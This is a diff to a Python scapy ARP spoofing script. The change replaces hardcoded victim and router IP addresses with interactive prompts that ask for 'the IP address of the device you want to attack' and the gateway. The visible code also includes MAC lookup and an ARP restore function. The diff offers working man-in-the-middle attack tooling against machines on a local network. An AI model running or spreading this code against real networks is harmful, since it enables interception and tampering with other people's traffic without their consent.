@@ -1,9 +1,6 @@
 from scapy.all import ARP, Ether, srp, sendp
 import time
 
-victim_ip = "192.168.1.187"
-router_ip = "192.168.1.1"
-
 
 def get_victim_mac():
     global victim_ip
@@ -28,6 +25,11 @@ def restore(victim_mac):
     router_mac = answered[0][1].hwsrc
     packet = Ether(dst=victim_mac) / ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=router_mac)
     sendp(packet, count=5, verbose=False)
+
+
+print("you can view the answers to the following quetions by running the comand ipconfig in the victim's terminal")
+victim_ip = input("Enter the IP address of the device you want to attack: ")
+router_ip = input("Enter the default gateway IP address of the network (usually your router's IP): ")
 
 
 victim_mac = get_victim_mac()
